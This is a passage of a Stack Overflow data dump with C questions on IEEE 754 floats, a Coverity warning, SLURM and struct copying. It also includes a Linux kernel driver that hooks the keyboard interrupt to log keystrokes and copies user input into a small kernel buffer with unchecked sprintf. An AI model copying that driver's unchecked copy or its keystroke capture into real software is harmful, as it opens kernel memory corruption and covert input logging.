this: <code>float GetFloat32(const uint8_t * buffer) { float f; memcpy(&amp;f, buffer, sizeof f); return f; }</code>. That way it looks nice, and is easier to modify if you need to port your code to other systems. (Like change the byte order, if new host has different endianness)"}], "tags": [], "owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "is_accepted": true, "score": 3, "last_activity_date": 1459346621, "last_edit_date": 1459346621, "creation_date": 1459346410, "answer_id": 36311108, "question_id": 36310341, "link": "https://stackoverflow.com/questions/36310341/c-how-to-store-ieee-754-double-and-single-precision/36311108#36311108", "title": "C - how to store IEEE 754 double and single precision", "body": "<p>First of all, you cannot do the pointer cast hack. There is absolutely no guarantee that your byte buffer is correctly aligned. This results in <em>undefined behaviour</em>. Use <code>memcpy</code> instead:</p>\n\n<pre><code>memcpy(&amp;first8bytes, &amp;buffer[8], 8); \nmemcpy(&amp;next4bytes, &amp;buffer[16], 4); \n</code></pre>\n\n<blockquote>\n  <p>What do I put instead of <code>IEE745double_t</code> and <code>IEEE745single_t</code>? Is it possible to do it with double and float?</p>\n</blockquote>\n\n<p>Yes, it's possible, <strong>if</strong>:</p>\n\n<ul>\n<li><code>double</code> is 8 bytes, <code>float</code> is 4 bytes and both use IEEE754 presentation.</li>\n<li>Data on <code>buffer</code> uses same byte order as your host. If not, you need to copy to temporary unsigned integer type first, where you fix the endianness.</li>\n</ul>\n\n<blockquote>\n  <p>And if so, how can I guarantee, that they will be 8 and 4 bytes long on every platform?</p>\n</blockquote>\n\n<p>Use static assertion to detect when it's not. For example:</p>\n\n<pre><code>static_assert(sizeof(float) == 4, \"invalid float size\");\n</code></pre>\n"}], "owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 444, "favorite_count": 0, "accepted_answer_id": 36311108, "answer_count": 1, "score": 0, "last_activity_date": 1459346621, "creation_date": 1459344587, "question_id": 36310341, "link": "https://stackoverflow.com/questions/36310341/c-how-to-store-ieee-754-double-and-single-precision", "title": "C - how to store IEEE 754 double and single precision", "body": "<p>I have to work with IEEE 745 double and single precision numbers.\nI have no idea, how to work with them correctly.</p>\n\n<p>I've got a buffer of binary data and I want to get the numbers like </p>\n\n<pre><code>uint8_t bufer[] = {................};\n//data I want are at 8th position, (IEEE745_t is my imaginary format)\nIEEE745double_t first8bytes = *(IEEE745double_t*)(buffer + 8);\nIEEE745single_t next4bytes = *(IEEE745single_t*)(buffer + 16);\n</code></pre>\n\n<p>What do I put instead of <code>IEE745double_t</code> and <code>IEEE745single_t</code> ? Is it possible to do it with double and float? And if so, how can I guarantee, that they will be 8 and 4 bytes long on every platform?</p>\n"}, {"tags": ["c", "linux-kernel", "kernel", "driver"], "comments": [{"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1459344707, "post_id": 36309939, "comment_id": 60244024, "body": "Why do you return 0 from your <code>dev_read</code>?"}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 1, "creation_date": 1459345063, "post_id": 36309939, "comment_id": 60244326, "body": "You should never copy more than <code>len</code> bytes to the user buffer."}, {"owner": {"reputation": 1476, "user_id": 617648, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f95d71778ac09f21d29a54b365514a5b?s=128&d=identicon&r=PG", "display_name": "obayhan", "link": "https://stackoverflow.com/users/617648/obayhan"}, "reply_to_user": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1459346241, "post_id": 36309939, "comment_id": 60245324, "body": "Yes i got it now :) thank you."}], "answers": [{"comments": [{"owner": {"reputation": 1476, "user_id": 617648, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f95d71778ac09f21d29a54b365514a5b?s=128&d=identicon&r=PG", "display_name": "obayhan", "link": "https://stackoverflow.com/users/617648/obayhan"}, "edited": false, "score": 0, "creation_date": 1459346139, "post_id": 36310542, "comment_id": 60245229, "body": "Thank you for your solution. It works but now i have a different problem with &quot;sprintf(message, &quot;%s(%d letters)&quot;, buffer, len);&quot; part :)"}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1459347428, "post_id": 36310542, "comment_id": 60246377, "body": "Try <code>snprintf(message, sizeof(message), &quot;%*s(%d letters)&quot;, len, buffer, len);</code>."}, {"owner": {"reputation": 1476, "user_id": 617648, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f95d71778ac09f21d29a54b365514a5b?s=128&d=identicon&r=PG", "display_name": "obayhan", "link": "https://stackoverflow.com/users/617648/obayhan"}, "edited": false, "score": 0, "creation_date": 1459348894, "post_id": 36310542, "comment_id": 60247670, "body": "And a little correction=&gt; the code below causes infinite loop , i dont know why but i solved it by removing &quot;retval = -EFAULT;&quot; and returning &quot;size_requested&quot; always"}], "tags": [], "owner": {"reputation": 244, "user_id": 6134918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dd3c3e4c2313fe66cc45a8b1e5c8e96?s=128&d=identicon&r=PG&f=1", "display_name": "Hugo", "link": "https://stackoverflow.com/users/6134918/hugo"}, "is_accepted": true, "score": 3, "last_activity_date": 1459345072, "creation_date": 1459345072, "answer_id": 36310542, "question_id": 36309939, "link": "https://stackoverflow.com/questions/36309939/linux-kernel-character-device-driver-returns-empty-string-to-userspace/36310542#36310542", "title": "Linux kernel character device driver returns empty string to userspace", "body": "<p>The <code>read</code> should return the number of bytes read. In your case, you are return 0.</p>\n\n<p><code>size_message = 0</code> </p>\n\n<p>You should do the following</p>\n\n<pre><code>size_t  size_requested;\n...\nif (len &gt;= size_of_message) {\n   size_requested  = size_of_message;\n} else {\n   size_requested = len;\n}\nif (copy_to_user (buf, message, size_requested)) {\n    retval = -EFAULT;\n    return retval\n}\nreturn size_requested;\n</code></pre>\n"}], "owner": {"reputation": 1476, "user_id": 617648, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f95d71778ac09f21d29a54b365514a5b?s=128&d=identicon&r=PG", "display_name": "obayhan", "link": "https://stackoverflow.com/users/617648/obayhan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 850, "favorite_count": 0, "accepted_answer_id": 36310542, "answer_count": 1, "score": 1, "last_activity_date": 1459345072, "creation_date": 1459343593, "question_id": 36309939, "link": "https://stackoverflow.com/questions/36309939/linux-kernel-character-device-driver-returns-empty-string-to-userspace", "title": "Linux kernel character device driver returns empty string to userspace", "body": "<pre><code>#include &lt;linux/init.h&gt;           \n#include &lt;linux/module.h&gt;         \n#include &lt;linux/device.h&gt;         \n#include &lt;linux/kernel.h&gt;         \n#include &lt;linux/fs.h&gt;             \n#include &lt;asm/uaccess.h&gt;         \n#include &lt;linux/interrupt.h&gt;\n#include &lt;asm/io.h&gt;\n\n#define  DEVICE_NAME \"kbdozgur\"   \n#define  CLASS_NAME  \"kbdozgur\"  \nMODULE_AUTHOR(\"Mehmet Ozgur Bayhan\");\nMODULE_LICENSE(\"GPL\");\nMODULE_DESCRIPTION(\"Interrupt buffering skeleton\");\nMODULE_VERSION(\"0.2\");\n\n#define BUFFER_SIZE 20\nstatic unsigned char bfr[BUFFER_SIZE]; \nstatic int bufferCounter = 0; \n\nstatic int majorNumber; \nstatic char message[BUFFER_SIZE] = { 0 }; \nstatic short size_of_message; \nstatic int numberOpens = 0; \nstatic struct class* kbdozgurcharClass = NULL; \nstatic struct device* kbdozgurcharDevice = NULL; \n\n\nstatic int dev_release(struct inode *, struct file *);\nstatic ssize_t dev_read(struct file *, char *, size_t, loff_t *);\nstatic ssize_t dev_write(struct file *, const char *, size_t, loff_t *);\n\nstatic struct file_operations fops = { .open = dev_open, .read = dev_read, .write = dev_write, .release = dev_release, };\n\nirq_handler_t irq_handler(int irq, void *dev_id, struct pt_regs *regs) {\n    static unsigned char scancode;\n    //Read keyboard status\n    scancode = inb(0x60);\n\n    if (scancode == 0x01) {\n        printk(KERN_INFO \"MOB: Inputs are &gt; %s\\n\", bfr);\n        bufferCounter = 0;\n        memset(&amp;bfr[0], 0, sizeof(bfr));\n    }\n    else if (scancode == 0x1E) {\n        bfr[bufferCounter] = 'a';\n        bufferCounter++;\n    }\n    else if (scancode == 0x1F) {\n        bfr[bufferCounter] = 's';\n        bufferCounter++;\n    }\n    else if (scancode == 0x20) {\n        bfr[bufferCounter] = 'd';\n        bufferCounter++;\n    }\n    else if (scancode == 0x21) {\n        bfr[bufferCounter] = 'f';\n        bufferCounter++;\n    }\n    else if (scancode == 0x22) {\n        bfr[bufferCounter] = 'g';\n        bufferCounter++;\n    }\n    else if (scancode == 0x23) {\n        bfr[bufferCounter] = 'h';\n        bufferCounter++;\n    }\n    else if (scancode == 0x24) {\n        bfr[bufferCounter] = 'j';\n        bufferCounter++;\n    }\n    if (bufferCounter &gt;= BUFFER_SIZE) {\n        bufferCounter = 0;\n        memset(&amp;bfr[0], 0, sizeof(bfr));\n    }\n\n    return (irq_handler_t) IRQ_HANDLED;\n}\n\nstatic int init_mod(void) {\n    int result;\n\n    /*\n     *****************************\n     * Create Character device\n     *****************************\n     */\n\n    // Try to dynamically allocate a major number for the device\n    majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops);\n    if (majorNumber &lt; 0) {\n        printk(KERN_ALERT \"MOB: kbdozgurcharClass failed to register a major number\\n\");\n        return majorNumber;\n    }\n    printk(KERN_INFO \"MOB: registered correctly with major number %d\\n\", majorNumber);\n    // Register the device class\n    kbdozgurcharClass = class_create(THIS_MODULE, CLASS_NAME);\n    if (IS_ERR(kbdozgurcharClass)) { // Check for error and clean up if there is\n        unregister_chrdev(majorNumber, DEVICE_NAME);\n        printk(KERN_ALERT \"MOB: Failed to register device class\\n\");\n        return PTR_ERR(kbdozgurcharClass); // Correct way to return an error on a pointer\n    }\n    printk(KERN_INFO \"MOB: device class registered correctly\\n\");\n\n    // Register the device driver\n    kbdozgurcharDevice = device_create(kbdozgurcharClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);\n    if (IS_ERR(kbdozgurcharDevice)) { // Clean up if there is an error\n        class_destroy(kbdozgurcharClass); // Repeated code but the alternative is goto statements\n        unregister_chrdev(majorNumber, DEVICE_NAME);\n        printk(KERN_ALERT \"MOB: Failed to create the device\\n\");\n        return PTR_ERR(kbdozgurcharDevice);\n    }\n    printk(KERN_INFO \"MOB: device class created correctly\\n\"); // Made it! device was initialized\n    /*\n     *****************************\n     * Bind interrupt\n     *****************************\n     */\n\n    result = request_irq(1, (irq_handler_t) irq_handler, IRQF_SHARED, \"kbdozgur\", (void *) (irq_handler));\n    if (result) printk(KERN_INFO \"MOB: can't get shared interrupt for keyboard\\n\");\n\n    printk(KERN_INFO \"MOB: kbdozgur loaded.\\n\");\n    return result;\n\n}\n\nstatic void exit_mod(void) {\n    /*\n     * ****************************\n     * Destroy Character Device\n     * ****************************\n     */\n    device_unregister(kbdozgurcharDevice);\n    device_destroy(kbdozgurcharClass, MKDEV(majorNumber, 0)); // remove the device\n    class_unregister(kbdozgurcharClass); // unregister the device class\n    class_destroy(kbdozgurcharClass); // remove the device class\n    unregister_chrdev(majorNumber, DEVICE_NAME); // unregister the major number\n    printk(KERN_INFO \"MOB: Goodbye from the LKM!\\n\");\n\n    /*\n     * ****************************\n     * Free IRQ bind\n     * ****************************\n     */\n    free_irq(1, (void *) (irq_handler));\n    printk(KERN_INFO \"MOB: kbdozgur unloaded.\\n\");\n}\n\nstatic int dev_open(struct inode *inodep, struct file *filep) {\n    numberOpens++;\n    printk(KERN_INFO \"MOB: Device has been opened %d time(s)\\n\", numberOpens);\n    return 0;\n}\n\n\nstatic ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset) {\n    int error_count = 0;\n    // copy_to_user has the format ( * to, *from, size) and returns 0 on success\n//  error_count = copy_to_user(buffer, message, size_of_message);\n    error_count = copy_to_user(buffer, \"test\", 4);\n\n    if (error_count == 0) { // if true then have success\n//      printk(KERN_INFO \"MOB: Sent %d characters to the user &gt;&gt; %s\\n\", size_of_message, message);\n        printk(KERN_INFO \"MOB: Sent %d characters to the user &gt;&gt; %s\\n\", 4, \"test\");\n        return (size_of_message = 0); // clear the position to the start and return 0\n    }\n    else {\n        printk(KERN_INFO \"MOB: Failed to send %d characters to the user\\n\", error_count);\n        return -EFAULT; // Failed -- return a bad address message (i.e. -14)\n    }\n}\n\n\nstatic ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset) {\n    sprintf(message, \"%s(%d letters)\", buffer, len); // appending received string with its length\n    size_of_message = strlen(message); // store the length of the stored message\n    printk(KERN_INFO \"MOB: Received %d characters from the user\\n\", len);\n    return len;\n}\n\nstatic int dev_release(struct inode *inodep, struct file *filep) {\n    printk(KERN_INFO \"MOB: Device successfully closed\\n\");\n    return 0;\n}\nmodule_init(init_mod);\nmodule_exit(exit_mod);\n</code></pre>\n\n<p>I am trying to build a skeleton driver for interrupt buffering and serving  to userspace.</p>\n\n<p>However my character device returns empty string to user space. I tried <strong>cat</strong> in shell and <strong>open</strong> and <strong>read</strong> in python. Both returns empty string. By the way it takes character array from user space normally and as i expected.</p>\n\n<p><strong>Related part >></strong></p>\n\n<pre><code>static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset) {\n    int error_count = 0;\n    // copy_to_user has the format ( * to, *from, size) and returns 0 on success\n    // error_count = copy_to_user(buffer, message, size_of_message);\n    error_count = copy_to_user(buffer, \"test\", 4);\n\n    if (error_count == 0) { // if true then have success\n//      printk(KERN_INFO \"MOB: Sent %d characters to the user &gt;&gt; %s\\n\", size_of_message, message);\n        printk(KERN_INFO \"MOB: Sent %d characters to the user &gt;&gt; %s\\n\", 4, \"test\");\n        return (size_of_message = 0); // clear the position to the start and return 0\n    }\n    else {\n        printk(KERN_INFO \"MOB: Failed to send %d characters to the user\\n\", error_count);\n        return -EFAULT; // Failed -- return a bad address message (i.e. -14)\n    }\n}\n</code></pre>\n\n<p>First i tried:</p>\n\n<pre><code>error_count = copy_to_user(buffer, message, size_of_message);\n</code></pre>\n\n<p>Then i tried for check:</p>\n\n<pre><code>error_count = copy_to_user(buffer, \"test\", 4);\n</code></pre>\n\n<p>Same story. Both returns empty string. There is no error. Nothing related in dmesg.</p>\n\n<p>I make my trials as root user and the file has that permissions:</p>\n\n<p><strong><em><code>crw------- 1 root root 250, 0 Mar 30 14:43 /dev/kbdozgur</code></em></strong></p>\n\n<p>So where did i do wrong?</p>\n"}, {"tags": ["c", "string", "malloc", "strlen", "coverity"], "answers": [{"comments": [{"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1459410275, "post_id": 36309903, "comment_id": 60276741, "body": "In effect, OP wrote <code>strlen(&amp;body[1])+1</code> which is precisely correct for a copy of the suffix starting at the second character (provided you know <code>body</code> has at least one character). This seems to have confused both Covertly and various SO folk, but it seems fine to me, and arguably better than <code>strlen(body)</code>."}], "tags": [], "owner": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "is_accepted": false, "score": 1, "last_activity_date": 1459343503, "creation_date": 1459343503, "answer_id": 36309903, "question_id": 36309675, "link": "https://stackoverflow.com/questions/36309675/coverity-deflect-string-length-miscalculation-bad-alloc-strlen/36309903#36309903", "title": "Coverity deflect: - String length miscalculation (BAD_ALLOC_STRLEN)", "body": "<p>No, <code>...body[1]</code> and <code>...body + 1</code> are <strong>not</strong> identical. The first has a type that is the element type of the <code>body</code> array, the second has type <em>ptr-to-element-type</em>. Read your C book again :-)</p>\n\n<p>Coverity tries to tell you that you make the same error as in</p>\n\n<pre><code>char foo[42];\n/* write a string to foo */\nbar = malloc (strlen(foo + 1)); /* which is strlen(&amp;foo[1]) */\n</code></pre>\n\n<p>when the correct code is</p>\n\n<pre><code>bar = malloc (strlen(foo) + 1);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": false, "score": 1, "last_activity_date": 1459345607, "last_edit_date": 1459345607, "creation_date": 1459343552, "answer_id": 36309926, "question_id": 36309675, "link": "https://stackoverflow.com/questions/36309675/coverity-deflect-string-length-miscalculation-bad-alloc-strlen/36309926#36309926", "title": "Coverity deflect: - String length miscalculation (BAD_ALLOC_STRLEN)", "body": "<p>I think you misunderstood the paranthesis.</p>\n\n<p>The <code>+ 1</code> in the coverity suggestion is <em>outside</em> the <code>strlen(...)</code></p>\n\n<p>I think coverity gets worried because you want to take <code>strlen</code> from index 1 instead of index 0. Coverity would expect index 0 as starting point - like:</p>\n\n<pre><code>body = malloc(strlen(&amp;((my_type*) *my_variable)-&gt;Param2.body[0]) +1);\n                                                             ^\n</code></pre>\n\n<p>which is also</p>\n\n<pre><code>body = malloc(strlen(((my_type*) *my_variable)-&gt;Param2.body) +1);\n              ^                                            ^\n            No &amp; operator                                No [0]\n</code></pre>\n\n<p>as suggested by coverity</p>\n"}, {"tags": [], "owner": {"reputation": 6260, "user_id": 3820025, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/zXOn4.png?s=128&g=1", "display_name": "Bence Kaulics", "link": "https://stackoverflow.com/users/3820025/bence-kaulics"}, "is_accepted": true, "score": 0, "last_activity_date": 1460030295, "last_edit_date": 1495541751, "creation_date": 1460030295, "answer_id": 36475511, "question_id": 36309675, "link": "https://stackoverflow.com/questions/36309675/coverity-deflect-string-length-miscalculation-bad-alloc-strlen/36475511#36475511", "title": "Coverity deflect: - String length miscalculation (BAD_ALLOC_STRLEN)", "body": "<p>I have reached that conclusion <a href=\"https://stackoverflow.com/users/1566221/rici\">@rici</a> was correct. Considering the following simulation: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct Param2{\n    char* body;\n}Param2;\n\nint main()\n{\n    Param2 test;\n    test.body = \"test_string\\0\";\n    printf(\"%s, size: %d + 1 terminating null\\n\\n\",test.body, strlen(test.body));\n\n    printf(\"original:                %d \\n\", (strlen(&amp;test.body[1]) + 1));\n    printf(\"what coverity thinks:    %d \\n\", strlen(test.body + 1));\n    printf(\"what coverity suggests:  %d \\n\", (strlen(test.body) + 1));\n    printf(\"a more transparent way:  %d \\n\\n\", (strlen(test.body + 1) + 1));\n\n    return 1;\n}\n</code></pre>\n\n<p>This is the output:\n   <a href=\"https://i.stack.imgur.com/6yV2d.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/6yV2d.png\" alt=\"![enter image description here\"></a></p>\n\n<p>There are three cases (4th is the same as 1st). The allocated memory can be seen on the image above for all cases. Now, if we want to copy the source string from the 2. byte (<code>&amp;body[1</code>]), that would mean 10 bytes of data in the example. And according to the strcpy <a href=\"http://www.cplusplus.com/reference/cstring/strcpy/\" rel=\"nofollow noreferrer\">documentation</a>:</p>\n\n<blockquote>\n  <p>To avoid overflows, the size of the array pointed by destination shall\n  be long enough to contain the same C string as source (including the\n  terminating null character), and should not overlap in memory with\n  source.</p>\n</blockquote>\n\n<p>We need one more for the null termination giving us 11 bytes to be allocated. Coverity believes that we are allocating 10 bytes, and suggest to allocate 12.</p>\n\n<p>But as we can see, the original code allocates 11 bytes which is the exact number of bytes we need here, making the coverity deflect false positive.</p>\n"}], "owner": {"reputation": 6260, "user_id": 3820025, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/zXOn4.png?s=128&g=1", "display_name": "Bence Kaulics", "link": "https://stackoverflow.com/users/3820025/bence-kaulics"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 245, "favorite_count": 0, "accepted_answer_id": 36475511, "answer_count": 3, "score": -1, "last_activity_date": 1460030295, "creation_date": 1459342911, "last_edit_date": 1460030285, "question_id": 36309675, "link": "https://stackoverflow.com/questions/36309675/coverity-deflect-string-length-miscalculation-bad-alloc-strlen", "title": "Coverity deflect: - String length miscalculation (BAD_ALLOC_STRLEN)", "body": "<p>I have a coverity deflect to be fixed but I am not sure about it. I have a function (<code>void my_function(a_type *my_variable)</code>) with the following problematic line of code:</p>\n\n<pre><code>body = malloc(strlen(&amp;((my_type*) *my_variable)-&gt;Param2.body[1]) +1);\n</code></pre>\n\n<p>where <code>body</code> is an <code>unsigned char*</code>.</p>\n\n<p>The Coverity message:</p>\n\n<pre><code>String length miscalculation (BAD_ALLOC_STRLEN)\nUsing \"strlen(((my_type *)*my_variable)-&gt;Param2.body + 1)\" \ninstead of \"strlen(((my_type *)*my_variable)-&gt;Param2.body) + 1\" \nas an argument to \"malloc\" might be an under-allocation.\n</code></pre>\n\n<hr>\n\n<p>Now, given the <code>strlen</code> function call, which looks like this: </p>\n\n<pre><code>strlen(&amp;((my_type*) *my_variable)-&gt;Param2.body[1])\n</code></pre>\n\n<p>and this line is identical to:</p>\n\n<pre><code>strlen(&amp;((my_type*) *my_variable)-&gt;Param2.body + 1)\n</code></pre>\n\n<p>So this should be changed according to the message, and the result would be:</p>\n\n<pre><code>body = malloc((strlen(&amp;((my_type*) *my_variable)-&gt;Param2.body)+1) +1);\n</code></pre>\n\n<p>Why is bad such an argument for <code>malloc</code>? I do not see what is the actual problem here so I am unsure about this solution and/or its necessity.</p>\n\n<p>Additional information is that, <code>&amp;((my_type*) *my_variable)-&gt;Param2.body[1]</code> (simply <code>&amp;Param2.body[1]</code>) will be copied into <code>body</code> using <code>strcpy</code>, like:</p>\n\n<pre><code>strcpy(body, &amp;((my_type *) *my_variable)-&gt;Param2.body[1]);\n</code></pre>\n"}, {"tags": ["c", "mpi", "slurm"], "answers": [{"tags": [], "owner": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "is_accepted": true, "score": 2, "last_activity_date": 1459345110, "creation_date": 1459345110, "answer_id": 36310559, "question_id": 36309212, "link": "https://stackoverflow.com/questions/36309212/how-to-set-number-of-task-per-node-in-slurm-based-on-the-parameter-that-i-passed/36310559#36310559", "title": "how to set number of task per node in slurm based on the parameter that I passed it to my program?", "body": "<p>That is not possible. Once your program is running, SLURM already had to fix the number of tasks per node. That is necessary to run the program.</p>\n\n<p>You can however turn this around: Set the number of tasks per node in SLURM and read it in your program. To that end, SLURM provides a number of environment variables. You can read <code>SLURM_STEP_TASKS_PER_NODE</code> with <code>getenv</code>. But you need to consider, that this may not be a single integer, but different from node to node. If it is the same for all nodes, it will have the form of <code>8(x2)</code> for two nodes with 8 cores each.</p>\n"}], "owner": {"reputation": 1523, "user_id": 5946384, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/ebdc50d90bcbb9b36c901545d2a9f637?s=128&d=identicon&r=PG&f=1", "display_name": "Matrix", "link": "https://stackoverflow.com/users/5946384/matrix"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 843, "favorite_count": 0, "accepted_answer_id": 36310559, "answer_count": 1, "score": 2, "last_activity_date": 1460625442, "creation_date": 1459341713, "last_edit_date": 1460625442, "question_id": 36309212, "link": "https://stackoverflow.com/questions/36309212/how-to-set-number-of-task-per-node-in-slurm-based-on-the-parameter-that-i-passed", "title": "how to set number of task per node in slurm based on the parameter that I passed it to my program?", "body": "<p>I want to set number of task per node as variable in slurm like: #SBATCH --ntasks-per-node=s*2; (s is number of socket per node that I pass it as parameter to my program). The code is as followed:\n a part of test.c file:</p>\n\n<pre><code>if (argc &lt; 3)\n{\nfprintf(stderr, \"Usage: mpiexec program &lt;#sockets&gt;\\n\");\nexit(1);\n}\ns = atoi(argv[1]);\n</code></pre>\n\n<p>bash script(slurm):</p>\n\n<pre><code>#!/bin/bash\n#SBATCH --job-name=test\n#SBATCH --time=00:30:00\n#SBATCH --account=1234\n#SBATCH --output=./test.out\n#SBATCH --nodes=4\n#SBATCH --mem-per-cpu=3900M\n#SBATCH --ntasks-per-node=s*2     ???  \n#SBATCH --exclusive\n\nsource /cluster/bin/jobsetup \nmodule load intel/2015.3\nmodule load openmpi.intel/1.8.6\n\ncd ~/filedir\nmpirun --map-by ppr:2:socket --report-bindings ./test 4 &gt; ./test\n</code></pre>\n\n<p>if I set ntasks-per-node a fixed amount like 8, it works fine. But how I can set it based on the parameter that I passed it to my program?\nI would appreciate for any help.</p>\n"}, {"tags": ["c", "pointers", "struct"], "comments": [{"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 1, "creation_date": 1459341028, "post_id": 36308830, "comment_id": 60241056, "body": "You can use memcpy if the structure does not contains pointers"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1459341056, "post_id": 36308830, "comment_id": 60241080, "body": "Depends on how deep you want your copy to be. For example of your struct type has pointer members, do you also want to duplicate those pointed by them?"}, {"owner": {"reputation": 97, "user_id": 4618203, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/5adcf59c370441c92b4809c25db5c902?s=128&d=identicon&r=PG&f=1", "display_name": "Yassine Bakkar", "link": "https://stackoverflow.com/users/4618203/yassine-bakkar"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1459341169, "post_id": 36308830, "comment_id": 60241179, "body": "@user3528438 Yes ! i would love to do that !!!!"}, {"owner": {"reputation": 533, "user_id": 4473118, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-cY1jfXqgFbU/AAAAAAAAAAI/AAAAAAAAADs/BSem3Uzbuiw/photo.jpg?sz=128", "display_name": "Guiroux", "link": "https://stackoverflow.com/users/4473118/guiroux"}, "reply_to_user": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1459341172, "post_id": 36308830, "comment_id": 60241181, "body": "@terencehill which is unlikely for <code>a complex structure</code>"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1459341300, "post_id": 36308830, "comment_id": 60241275, "body": "Then you need to write a function to do it. Allocate the top level struct, initialize all pointer members with valid memory and copy data to there, go as further down as you need to. There&#39;s no language syntax to do deep-copy for you. You need to write your code to do it. And please update your question to make clear that you want to do <code>deep copy</code>."}, {"owner": {"reputation": 97, "user_id": 4618203, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/5adcf59c370441c92b4809c25db5c902?s=128&d=identicon&r=PG&f=1", "display_name": "Yassine Bakkar", "link": 